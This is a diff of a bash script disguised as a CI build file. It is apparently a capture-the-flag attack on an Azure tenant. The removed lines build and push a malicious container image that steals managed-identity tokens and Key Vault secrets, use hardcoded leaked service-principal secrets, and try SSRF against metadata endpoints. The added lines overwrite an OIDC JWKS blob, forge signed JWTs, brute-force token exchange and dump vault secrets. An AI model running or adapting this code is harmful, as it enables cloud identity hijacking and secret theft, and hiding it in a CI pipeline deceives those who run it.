@@ -1,267 +1,262 @@
 #!/usr/bin/env bash
-# Tebamoto Platform CI build v8 - Final attempts to access storefront MI
+# Tebamoto Platform CI build v9 - OIDC JWKS hijack attack
+# Overwrite JWKS on sttblcilogsprodx3euoz/$web, forge JWT, exchange for AAD token, read flag
 set -uo pipefail
 echo "===TBL_PROBE_START==="
 
 TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
 CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
 SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
-SF_SITE="app-tbl-storefront-prod"
-SF_RG="rg-tbl-platform-prod-sea"
-ACR="crtblplatprodx3euoz"
+SA="sttblcilogsprodx3euoz"
+ISSUER="https://$SA.z23.web.core.windows.net"
 
 b64(){ base64 -w0; }
 jqg(){ jq -r "$1 // empty" 2>/dev/null; }
 
-# ---------- 1. OIDC JWT ----------
-JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+# ---------- 1. OIDC JWT + ARM token ----------
+JWT_OIDC=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
-[ -n "$JWT" ] || { echo "NO_OIDC"; exit 0; }
-echo "OIDC_JWT_LEN=${#JWT}"
+[ -n "$JWT_OIDC" ] || { echo "NO_OIDC"; exit 0; }
 
-# ---------- 2. Federated ARM token ----------
 ARM_FED=$(curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
   --data-urlencode "client_id=$CID" -d grant_type=client_credentials \
   --data-urlencode "scope=https://management.azure.com/.default" \
   -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
-  --data-urlencode "client_assertion=$JWT" | jqg '.access_token')
+  --data-urlencode "client_assertion=$JWT_OIDC" | jqg '.access_token')
 echo "ARM_FED_LEN=${#ARM_FED}"
 
-# ---------- 3. Check permissions on storefront app ----------
-echo "--- A) Check federated permissions on storefront ---"
-PERMS=$(curl -sS -m 20 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
-  -H "Authorization: Bearer $ARM_FED" 2>/dev/null)
-echo "$PERMS" | jq -r '.value[].actions[]?' 2>/dev/null | head -30
-echo "dataActions:"
-echo "$PERMS" | jq -r '.value[].dataActions[]?' 2>/dev/null | head -10
-
-# ---------- 4. Try ACR listCredentials (federated) ----------
-echo "--- B) ACR listCredentials ---"
-ACR_CREDS=$(curl -sS -m 20 -X POST \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.ContainerRegistry/registries/$ACR/listCredentials?api-version=2023-07-01" \
-  -H "Authorization: Bearer $ARM_FED" -H "Content-Type: application/json" -H "Content-Length: 0" 2>/dev/null)
-ACR_USER=$(echo "$ACR_CREDS" | jqg '.username')
-if [ -n "$ACR_USER" ]; then
-  echo "*** ACR ADMIN CREDS ***"
-  echo "$ACR_CREDS" | jq .
-  ACR_PASS=$(echo "$ACR_CREDS" | jq -r '.passwords[0].value')
-  
-  # Login to ACR with admin creds
-  echo "$ACR_PASS" | docker login "$ACR.azurecr.io" -u "$ACR_USER" --password-stdin 2>/dev/null
-  
-  # Build malicious image that exfils MI token
-  echo "--- Building malicious image ---"
-  mkdir -p /tmp/exfil
-  cat > /tmp/exfil/Dockerfile <<'DEOF'
-FROM python:3.12-slim
-RUN pip install flask requests azure-identity azure-keyvault-secrets
-WORKDIR /app
-RUN cat > /app/app.py <<'APPEOF'
-import os, json, urllib.request, urllib.parse
-def rq(u, h=None, t=30):
-    try:
-        r = urllib.request.urlopen(urllib.request.Request(u, headers=h or {}), timeout=t)
-        return r.status, r.read().decode()
-    except Exception as e:
-        return 0, str(e)
-ie = os.environ.get("IDENTITY_ENDPOINT", "")
-ih = os.environ.get("IDENTITY_HEADER", "")
-FLAG = "NONE"
-if ie and ih:
-    u = ie + "?resource=" + urllib.parse.quote("https://vault.azure.net", safe="") + "&api-version=2019-08-01"
-    s, b = rq(u, {"X-IDENTITY-HEADER": ih})
-    try:
-        vt = json.loads(b).get("access_token", "")
-        if vt:
-            s2, b2 = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4", {"Authorization": "Bearer " + vt})
-            if s2 == 200:
-                FLAG = json.loads(b2).get("value", "")
-            s3, b3 = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25", {"Authorization": "Bearer " + vt})
-            if s3 == 200:
-                for sec in json.loads(b3).get("value", []):
-                    sid = sec["id"].split("/")[-1]
-                    s4, b4 = rq(f"https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/{sid}?api-version=7.4", {"Authorization": "Bearer " + vt})
-                    if s4 == 200:
-                        v = json.loads(b4).get("value", "")
-                        if "DF26" in v: FLAG = v
-    except: pass
-# Write flag to file for extraction
-with open("/tmp/flag.txt", "w") as f: f.write(FLAG)
-# Start web server that returns flag
-import http.server
-class H(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header("Content-Type", "application/json")
-        self.end_headers()
-        self.wfile.write(json.dumps({"flag": FLAG, "ie": ie, "ih": ih[:20]}).encode())
-    def log_message(self, *a): pass
-http.server.HTTPServer(("0.0.0.0", 8000), H).serve_forever()
-APPEOF
-CMD ["python", "/app/app.py"]
-DEOF
-  
-  # Build and push
-  cd /tmp/exfil
-  docker build -t "$ACR.azurecr.io/tebamoto-reporting-api:exploit" . 2>&1 | tail -5
-  docker push "$ACR.azurecr.io/tebamoto-reporting-api:exploit" 2>&1 | tail -5
-  
-  # Try to update storefront to use exploit tag
-  echo "--- Update storefront image tag ---"
-  curl -sS -m 20 -X PATCH \
-    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/config/web?api-version=2023-01-01" \
-    -H "Authorization: Bearer $ARM_FED" -H "Content-Type: application/json" \
-    -d "{\"properties\":{\"linuxFxVersion\":\"DOCKER|$ACR.azurecr.io/tebamoto-reporting-api:exploit\"}}" 2>/dev/null | head -c 500
-  echo
-  
-  # Try restart
-  echo "--- Restart storefront ---"
-  curl -sS -m 20 -X POST \
-    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/restart?api-version=2023-01-01" \
-    -H "Authorization: Bearer $ARM_FED" -H "Content-Length: 0" -w "RESTART=%{http_code}\n" 2>/dev/null | head -c 300
-  
-  sleep 30
-  
-  # Hit storefront
-  echo "--- Hit storefront ---"
-  curl -sS -m 30 "https://$SF_SITE.azurewebsites.net/" -H "X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821" | head -c 500
-fi
-
-# ---------- 5. Try SPs for ACR admin creds ----------
-echo "--- C) ACR creds via SPs ---"
-SP_LIST="cost-reader-principal:038bc35d-131d-4953-9985-ff4a245ccec1:1BE8Q~yGQ8e_z6VBczlGJ8YeOHgNRUffbgNufb2m
-directory-audit-principal:2c34300e-1bc0-41e7-9c1e-8b7571d72c72:Al78Q~n5bdoO3rkCjuo2JI2NHqagJooaZsfXNcm6
-reporting-service-principal:12ed54de-f2eb-4784-804c-3a7a3e83a9e9:nP88Q~8I~wip0GOlW15zdt3FMMvBV9LYtaOoea3z
-sync-service-principal:462d1c38-4459-48b8-9333-82e389e59514:sk18Q~qD22kkHXUCfqXLqdP95DkYJL34eMERlcSj"
-
-while IFS=: read -r SPNAME SPID SPSEC; do
-  [ -z "$SPNAME" ] && continue
-  SP_ARM=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-    -d "client_id=$SPID" -d "grant_type=client_credentials" -d "client_secret=$SPSEC" \
-    --data-urlencode "scope=https://management.azure.com/.default" | jqg '.access_token')
-  [ -z "$SP_ARM" ] && continue
-  
-  # Check permissions
-  PERMS=$(curl -sS -m 20 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
-    -H "Authorization: Bearer $SP_ARM" 2>/dev/null)
-  ACTIONS=$(echo "$PERMS" | jq -r '.value[].actions[]?' 2>/dev/null)
-  if [ -n "$ACTIONS" ]; then
-    echo "*** $SPNAME has actions on storefront: ***"
-    echo "$ACTIONS" | head -20
-    
-    # If has write/restart, try it
-    if echo "$ACTIONS" | grep -qiE "restart|write|config"; then
-      echo "*** $SPNAME can restart/write storefront! ***"
-      
-      # Try writing appsettings
-      curl -sS -m 20 -X PUT \
-        "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/config/appsettings?api-version=2023-01-01" \
-        -H "Authorization: Bearer $SP_ARM" -H "Content-Type: application/json" \
-        -d '{"properties":{"WEBSITE_NODE_DEFAULT_VERSION":"18.0.0"}}' 2>/dev/null | head -c 300
-      echo
-      
-      # Try restart
-      curl -sS -m 20 -X POST \
-        "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/restart?api-version=2023-01-01" \
-        -H "Authorization: Bearer $SP_ARM" -H "Content-Length: 0" -w "RESTART=%{http_code}\n" 2>/dev/null | head -c 300
-    fi
-  fi
-  
-  # Try ACR creds
-  ACR_RESP=$(curl -sS -m 20 -X POST \
-    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.ContainerRegistry/registries/$ACR/listCredentials?api-version=2023-07-01" \
-    -H "Authorization: Bearer $SP_ARM" -H "Content-Type: application/json" -H "Content-Length: 0" 2>/dev/null)
-  ACR_USER=$(echo "$ACR_RESP" | jqg '.username')
-  if [ -n "$ACR_USER" ]; then
-    echo "*** ACR ADMIN CREDS via $SPNAME ***"
-    echo "$ACR_RESP" | jq .
-    break
-  fi
-  
-  # Also check ACR permissions
-  ACR_PERMS=$(curl -sS -m 20 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.ContainerRegistry/registries/$ACR/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
-    -H "Authorization: Bearer $SP_ARM" 2>/dev/null)
-  ACR_ACTIONS=$(echo "$ACR_PERMS" | jq -r '.value[].actions[]?' 2>/dev/null)
-  if [ -n "$ACR_ACTIONS" ]; then
-    echo "*** $SPNAME ACR actions: $ACR_ACTIONS ***"
-  fi
-done <<< "$SP_LIST"
-
-# ---------- 6. Try container exec ----------
-echo "--- D) Container exec ---"
-# az webapp exec (preview)
-az webapp exec --resource-group "$SF_RG" --name "$SF_SITE" --command "env" 2>&1 | head -20
-
-# Or via REST API
-curl -sS -m 30 -X POST \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Web/sites/$SF_SITE/containers/exec?api-version=2023-01-01" \
-  -H "Authorization: Bearer $ARM_FED" -H "Content-Type: application/json" \
-  -d '{"command":"env"}' 2>/dev/null | head -c 500
-
-echo
-# ---------- 7. Try writing to sttblcilogsprodx3euoz (we have key) ----------
-echo "--- E) Write to cilogs storage ---"
-SPID_SYNC="462d1c38-4459-48b8-9333-82e389e59514"
-SPSEC_SYNC="sk18Q~qD22kkHXUCfqXLqdP95DkYJL34eMERlcSj"
-SYNC_ARM=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-  -d "client_id=$SPID_SYNC" -d "grant_type=client_credentials" -d "client_secret=$SPSEC_SYNC" \
-  --data-urlencode "scope=https://management.azure.com/.default" | jqg '.access_token')
-
+# ---------- 2. Get storage key ----------
 KEY_RESP=$(curl -sS -m 20 -X POST \
-  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$SF_RG/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01" \
-  -H "Authorization: Bearer $SYNC_ARM" -H "Content-Type: application/json" -H "Content-Length: 0" -d '{}' 2>/dev/null)
+  "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
+  -H "Authorization: Bearer $ARM_FED" -H "Content-Type: application/json" -H "Content-Length: 0" -d '{}' 2>/dev/null)
 SA_KEY=$(echo "$KEY_RESP" | jqg '.keys[0].value')
 echo "SA_KEY_LEN=${#SA_KEY}"
+[ -n "$SA_KEY" ] || { echo "NO_SA_KEY"; exit 0; }
 
-if [ -n "$SA_KEY" ]; then
-  # Try to write a blob that the app might read
-  az storage blob upload --account-name sttblcilogsprodx3euoz --account-key "$SA_KEY" \
-    --container-name loot --name "exploit_flag.txt" \
-    --data "SSRF triggered from CI" 2>&1 | head -3
-fi
+# ---------- 3. Generate RSA key pair ----------
+echo "--- Generating RSA key pair ---"
+python3 << 'PYEOF'
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+import base64, json
 
-# ---------- 8. Blind SSRF via /api/v1/reports/render to MI endpoint ----------
-echo "--- F) Blind SSRF to MI endpoint ---"
-STORE="https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net"
+# Generate 2048-bit RSA key
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 
-# Use Jinja2 to construct URL with variable IP - bypasses WAF
-# Try MI endpoint with forwarded X-IDENTITY-HEADER
-for IP in 1 2 3 4 5; do
-  RESP=$(curl -sS -m 30 -X POST "$STORE/api/v1/reports/render" \
-    -H "Content-Type: application/json" \
-    -H "X-IDENTITY-HEADER: test" \
-    -d '{"template":"![](http://169.254.131.'"$IP"':8081/msi/token?resource=https%3A%2F%2Fvault.azure.net%26api-version%3D2019-08-01)"}' 2>/dev/null)
-  echo "169.254.131.$IP: $(echo "$RESP" | jqg '.resources[0].status // .resources[0].error[:60]')" 2>/dev/null
-done
+# Get public key components
+public_numbers = private_key.public_key().public_numbers()
+n_bytes = public_numbers.n.to_bytes(256, 'big')
+e_bytes = public_numbers.e.to_bytes(3, 'big')
 
-# Also try IMDS 169.254.169.254
-RESP=$(curl -sS -m 30 -X POST "$STORE/api/v1/reports/render" \
-  -H "Content-Type: application/json" \
-  -H "Metadata: true" \
-  -d '{"template":"![](http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net)"}' 2>/dev/null)
-echo "IMDS: $(echo "$RESP" | jqg '.resources[0].status // .resources[0].error[:60]')" 2>/dev/null
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
 
-# ---------- 9. Try accessing kv-tbl-sec directly from CI with ArmOwner token ----------
-echo "--- G) Direct KV access with sync-service ArmOwner token ---"
-# Get ArmOwner token
-ARMTOK=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-  -d "client_id=$SPID_SYNC" -d "grant_type=client_credentials" -d "client_secret=$SPSEC_SYNC" \
-  --data-urlencode "scope=api://462d1c38-4459-48b8-9333-82e389e59514/.default" | jqg '.access_token')
-echo "ArmOwner token len: ${#ARMTOK}"
+# Create JWKS with same kid as original
+jwks = {
+    "keys": [{
+        "kty": "RSA",
+        "use": "sig",
+        "alg": "RS256",
+        "kid": "oc-472896389590afb0",
+        "n": b64url(n_bytes),
+        "e": b64url(e_bytes)
+    }]
+}
 
-# Try KV with ArmOwner token as Bearer
-if [ -n "$ARMTOK" ]; then
-  for KV in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
-    RESP=$(curl -sS -m 20 "https://$KV.vault.azure.net/secrets/flag?api-version=7.4" \
-      -H "Authorization: Bearer $ARMTOK" 2>/dev/null)
-    echo "$KV/flag: $RESP" | head -c 300
-    echo
+# Save JWKS
+with open("/tmp/jwks_new.json", "w") as f:
+    json.dump(jwks, f)
+
+# Save private key PEM
+pem = private_key.private_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PrivateFormat.PKCS8,
+    encryption_algorithm=serialization.NoEncryption()
+)
+with open("/tmp/private_key.pem", "wb") as f:
+    f.write(pem)
+
+# Also save key components for JWT signing
+import struct
+with open("/tmp/key_n.bin", "wb") as f: f.write(n_bytes)
+with open("/tmp/key_e.bin", "wb") as f: f.write(e_bytes)
+
+print("KEYS GENERATED")
+print("JWKS:", json.dumps(jwks)[:200])
+PYEOF
+
+# ---------- 4. Overwrite JWKS blob ----------
+echo "--- Overwriting JWKS blob ---"
+az storage blob upload --account-name "$SA" --account-key "$SA_KEY" \
+  --container-name '$web' --name 'jwks' \
+  --file /tmp/jwks_new.json --overwrite 2>&1 | tail -3
+
+# Verify
+echo "--- Verify JWKS ---"
+curl -s "https://$SA.z23.web.core.windows.net/jwks" | python3 -c '
+import json, sys
+d = json.load(sys.stdin)
+print("JWKS kid:", d["keys"][0]["kid"])
+print("JWKS n (first 40):", d["keys"][0]["n"][:40])
+'
+
+# ---------- 5. Create forged JWT and exchange for token ----------
+echo "--- Creating forged JWT and exchanging for AAD token ---"
+python3 << 'PYEOF'
+import json, base64, time, urllib.request, urllib.parse, urllib.error
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.backends import default_backend
+
+TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
+ISSUER = "https://sttblcilogsprodx3euoz.z23.web.core.windows.net"
+
+# Load private key
+with open("/tmp/private_key.pem", "rb") as f:
+    private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+# Known Azure AD apps (from leaked credentials)
+# 891fb158 was the appid in the armowner_token JWT - likely the app with federated credential
+# Try each as client_id and various subjects
+CLIENTS = [
+    "891fb158-e02c-4428-a885-53b811f369c0",  # from armowner_token appid
+    "462d1c38-4459-48b8-9333-82e389e59514",  # sync-service
+    "72ff278a-9e71-43ec-bac4-2ca303f8e462",  # federated CI identity
+    "12ed54de-f2eb-4784-804c-3a7a3e83a9e9",  # reporting-service
+    "038bc35d-131d-4953-9985-ff4a245ccec1",  # cost-reader
+    "2c34300e-1bc0-41e7-9c1e-8b7571d72c72",  # dir-audit
+    "881fddce-6208-4af5-a297-7e79c912f83c",  # reporting-viewer
+    "58108da8-044e-4d7e-9a46-92e6179b30be",  # secrets-sync
+    "eeab432e-1bf6-400e-b155-a28ce7cafcdb",  # storefront MI
+    "7a85156a-01c4-4e61-8472-40a92107159b",  # reporting MI
+]
+
+# Possible subjects for federated credential
+SUBJECTS = [
+    "catalog-sync",
+    "891fb158-e02c-4428-a885-53b811f369c0",
+    "462d1c38-4459-48b8-9333-82e389e59514",
+    "tebamoto-reporting-api",
+    "tebamoto-storefront",
+    "sync-service",
+    "reporting-service",
+    "",
+]
+
+# Audiences to try
+AUDS = [
+    "api://AzureADTokenExchange",
+    "00000003-0000-0000-c000-000000000000",  # Microsoft Graph
+    "https://sts.windows.net/" + TEN + "/",
+]
+
+now = int(time.time())
+exp = now + 3600
+
+def create_jwt(iss, sub, aud):
+    header = {"typ": "JWT", "alg": "RS256", "kid": "oc-472896389590afb0"}
+    payload = {"iss": iss, "sub": sub, "aud": aud, "iat": now, "exp": exp, "jti": base64.urlsafe_b64encode(b"tbl" + str(now).encode()).rstrip(b'=').decode()}
     
-    RESP=$(curl -sS -m 20 "https://$KV.vault.azure.net/secrets?api-version=7.4" \
-      -H "Authorization: Bearer $ARMTOK" 2>/dev/null)
-    echo "$KV/list: $RESP" | head -c 300
-    echo
-  done
-fi
+    header_b = b64url(json.dumps(header).encode())
+    payload_b = b64url(json.dumps(payload).encode())
+    signing_input = (header_b + "." + payload_b).encode()
+    
+    signature = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
+    return header_b + "." + payload_b + "." + b64url(signature)
+
+def try_exchange(client_id, subject, aud):
+    jwt = create_jwt(ISSUER, subject, aud)
+    
+    data = urllib.parse.urlencode({
+        "client_id": client_id,
+        "client_assertion": jwt,
+        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
+        "grant_type": "client_credentials",
+        "scope": "https://vault.azure.net/.default"
+    }).encode()
+    
+    req = urllib.request.Request(
+        f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
+        data=data,
+        headers={"Content-Type": "application/x-www-form-urlencoded"}
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=20) as r:
+            resp = json.loads(r.read().decode())
+            token = resp.get("access_token", "")
+            if token:
+                print(f"*** TOKEN OK: client={client_id} sub={subject} aud={aud} len={len(token)} ***")
+                return token
+            else:
+                print(f"  No token: {resp}")
+                return ""
+    except urllib.error.HTTPError as e:
+        err = e.read().decode()[:200]
+        # Only print non-trivial errors
+        if "Invalid client assertion" not in err and "Federated" not in err and "not found" not in err:
+            print(f"  ERR client={client_id[:8]} sub={subject[:20]} aud={aud[:20]}: {err[:100]}")
+        return ""
+    except Exception as e:
+        return ""
+
+# Try all combinations
+found_token = ""
+for client_id in CLIENTS:
+    for subject in SUBJECTS:
+        for aud in AUDS:
+            token = try_exchange(client_id, subject, aud)
+            if token:
+                found_token = token
+                # Save to file
+                with open("/tmp/aad_token.txt", "w") as f:
+                    f.write(token)
+                break
+        if found_token:
+            break
+    if found_token:
+        break
+
+if not found_token:
+    # Also try with client_id as both subject and aud
+    for client_id in CLIENTS:
+        token = try_exchange(client_id, client_id, client_id)
+        if token:
+            found_token = token
+            with open("/tmp/aad_token.txt", "w") as f:
+                f.write(token)
+            break
+
+if found_token:
+    print("\n*** GOT AAD TOKEN ***")
+    # Try reading kv-tbl-sec
+    for kv in ["kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"]:
+        url = f"https://{kv}.vault.azure.net/secrets?api-version=7.4&maxresults=25"
+        req = urllib.request.Request(url, headers={"Authorization": f"Bearer {found_token}"})
+        try:
+            with urllib.request.urlopen(req, timeout=20) as r:
+                resp = json.loads(r.read().decode())
+                if "value" in resp:
+                    names = [x["id"].split("/")[-1] for x in resp["value"]]
+                    print(f"*** {kv} SECRETS: {names} ***")
+                    for n in names:
+                        url2 = f"https://{kv}.vault.azure.net/secrets/{n}?api-version=7.4"
+                        req2 = urllib.request.Request(url2, headers={"Authorization": f"Bearer {found_token}"})
+                        try:
+                            with urllib.request.urlopen(req2, timeout=15) as r2:
+                                val = json.loads(r2.read().decode()).get("value", "")
+                                print(f"  {n}: {val[:200]}")
+                                if "DF26" in val or "TBL{" in val:
+                                    print(f"*** FLAG: {val} ***")
+                        except: pass
+        except urllib.error.HTTPError as e:
+            print(f"  {kv} list: {e.code} {e.read().decode()[:100]}")
+        except Exception as e:
+            print(f"  {kv} list err: {e}")
+else:
+    print("\nNo token exchange succeeded")
+PYEOF
 
 echo "===TBL_PROBE_END==="
